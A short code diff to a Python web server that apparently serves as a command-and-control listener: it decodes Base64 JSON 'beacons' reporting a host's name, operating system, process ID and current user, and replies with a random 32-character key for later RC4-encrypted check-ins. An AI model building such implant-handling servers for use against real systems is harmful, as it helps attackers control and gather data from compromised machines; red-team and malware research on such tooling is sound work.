@@ -53,7 +53,22 @@ class WebServer(object):
         # if initial Base64 beacon
         # new beacon
         if self.is_base64(raw_data) is True:
-            return "Base64 beacon"
+            # Base64 decodes POST data
+            decoded = base64.b64decode(raw_data).decode()
+
+            # parses JSON POST data
+            j = json.loads(decoded)
+            hostname = j["h"]
+            operating_system = j["o"]
+            process_id = j["p"]
+            current_user = j["u"]
+
+            # generates a random 32 character encryption key
+            # (upper and lower, no numbers)
+            key = "".join(random.SystemRandom().choice(string.ascii_letters)
+                          for _ in range(32))
+
+            return key
 
         # else RC4-encrypted beacon
         else:
